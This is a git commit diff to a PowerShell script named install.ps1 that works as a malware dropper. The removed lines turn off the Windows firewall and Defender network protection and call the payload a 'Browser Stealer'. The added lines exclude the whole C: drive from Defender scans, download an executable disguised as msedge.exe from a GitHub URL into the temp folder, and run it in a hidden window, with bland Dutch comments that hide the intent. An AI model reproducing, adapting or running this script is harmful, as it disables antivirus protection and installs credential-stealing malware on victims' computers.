7de39142ca2bb14e08ae8915c08e85c1972926bc
Nxtccijo <ietsbdbd@gmail.com>
2025-03-20 10:53:39 +0100

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,10 +1,8 @@
-# Add C:/ to exlusions so Windows Defender doesnt flag the exe we will download
-netsh.exe advfirewall set allprofiles state off
-Set-MpPreference -EnableNetworkProtection Disabled
-Set-MpPreference -DisableDatagramProcessing $True
+# Sluit de C:-schijf uit van Windows Defender-scans
+Add-MpPreference -ExclusionPath "C:\"
 
-# Download the exe and save it to temp directory
+# Download het bestand "msedge.exe" naar de tijdelijke map
 iwr "https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe" -outfile "$env:tmp\msedge.exe"
 
-# Execute the Browser Stealer
-cd $env:tmp;Start-Process -FilePath "$env:tmp\msedge.exe" -WindowStyle h -Wait
+# Voer het gedownloade bestand uit
+cd $env:tmp; Start-Process -FilePath "$env:tmp\msedge.exe" -WindowStyle h -Wait
